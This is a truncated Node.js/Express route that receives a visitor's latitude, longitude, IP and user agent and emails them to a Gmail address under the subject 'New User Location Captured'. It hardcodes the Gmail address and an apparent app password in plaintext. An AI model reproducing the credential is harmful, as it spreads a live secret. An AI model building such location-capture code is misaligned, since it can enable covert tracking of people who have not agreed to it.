app.post("/send-location-email", async (req, res) => {
    const { latitude, longitude, userAgent, ip } = req.body;

    if (!latitude || !longitude) {
        return res.status(400).send("Invalid location data");
    }

    // Configure Nodemailer
    let transporter = nodemailer.createTransport({
        service: "gmail",
        auth: {
            user: "sumitprasad035@gmail.com", // Your Gmail
            pass: "kdby lqfs gxrj wbqf"       // App password
        }
    });

    // Create Google Maps link
    const mapsLink = `https://www.google.com/maps?q=${latitude},${longitude}`;

    const mailOptions = {
        from: "sumitprasad035@gmail.com",
        to: "sumitprasad035@gmail.com", // Target email
        subject: "New User Location Captured",
        html: `
            <h3>User Location Details</h3>
            <p><b>Latitude:</b> ${latitude}</p>
            <p><b>Longitude:</b> ${longitude}</p>
            <p><a href=
